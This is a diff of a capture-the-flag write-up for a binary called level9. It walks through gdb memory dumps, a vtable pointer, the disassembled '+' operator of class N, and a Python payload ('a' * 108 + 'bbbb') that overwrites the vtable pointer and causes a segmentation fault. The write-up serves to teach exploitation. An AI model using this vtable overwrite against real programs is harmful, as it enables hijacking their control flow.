@@ -96,15 +96,50 @@ From these informations we can see the memory layout of _a_ and _b_:
 0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
 ```
 
-The line starts with the address of the class' vtable: 0x08048848. We can see it
-again 7 lines down at b's address (0x804a078). Then there's the character buffer
-filled with our input (from 0x804a00c to 0x804a028). Finally, at the end of the
-7th line there is a word containing the value 5 (at 0x804a070) which was _a_'s
-initialization value. _b_ is layed out simirlarly but with an empty character
-buffer and its value set to 6 on the last line (at 0x804a0e0).
+We can see the character buffer from the second word on the first line up to the
+end of the second line (from 0x804a00c to 0x804a028), and that it is filled with
+our input as expected. At the end of the 7th line there is a word containing the
+value 5 (at 0x804a070) which was _a_'s initialization value. _b_ is layed out
+simirlarly but with an empty character buffer and its value set to 6 on the last
+line (at 0x804a0e0).
 
-#### TEMP (to be reworked)
-* info about vtables *
-overwrite b's vtable address and replace it by "bbbb":
+Also, both _a_ and _b_ start with the same value 0x08048848. It is the first
+word and we can see it again 7 lines down at b's address (0x804a078). If we
+check it out, we can see that it points to the address of a function:
+
+```shell
+(gdb) x 0x08048848
+0x8048848 <_ZTV1N+8>:   0x0804873a
+(gdb) x 0x0804873a
+0x804873a <_ZN1NplERS_>:        0x8be58955
+(gdb) disass _ZN1NplERS_
+Dump of assembler code for function _ZN1NplERS_:
+   0x0804873a <+0>:     push   %ebp
+   0x0804873b <+1>:     mov    %esp,%ebp
+   0x0804873d <+3>:     mov    0x8(%ebp),%eax
+   0x08048740 <+6>:     mov    0x68(%eax),%edx
+   0x08048743 <+9>:     mov    0xc(%ebp),%eax
+   0x08048746 <+12>:    mov    0x68(%eax),%eax
+   0x08048749 <+15>:    add    %edx,%eax
+   0x0804874b <+17>:    pop    %ebp
+   0x0804874c <+18>:    ret
+End of assembler dump.
+```
+
+This really short function takes two parameters, fetches a value at an offset of
+0x68 (104) bytes and adds them. This precisely where the numeric value of the
+_N_ class is located. So this is the '+' operator for the class. At the next
+address, 4 bytes after we have the '-' operator:
+
+```shell
+(gdb) x 0x804874e
+0x804874e <_ZN1NmiERS_>:        0x8be58955
+```
+
+If we overwrite this value by providing the right payload to the binary, the
+program segfaults because _b_'s '+' operator is used at the end of the program.
+
+```shell
 ./level9 "$(python -c 'print "a" * 108 + "bbbb"')"
-#### TEMP
+Segmentation fault (core dumped)
+```
